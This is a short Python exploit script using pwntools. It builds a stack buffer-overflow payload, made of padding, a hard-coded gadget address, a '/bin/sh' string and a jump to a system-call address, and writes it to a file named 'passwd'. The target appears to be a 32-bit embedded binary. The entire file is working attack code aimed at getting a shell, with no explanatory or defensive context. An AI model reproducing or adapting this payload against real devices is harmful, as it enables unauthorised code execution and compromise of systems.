from pwn import *

do_system_addr=0x400390
stack_finder_addr=0x004038D0
f=open("passwd","wb")
data='a'*(0x1a0-4)
data+=p32(stack_finder_addr)
data+='a'*0x18
data+='/bin/sh\x00'
data=data.ljust(0x1a0+0x54,'a')
data+=p32(do_system_addr)
f.write(data)
f.close()
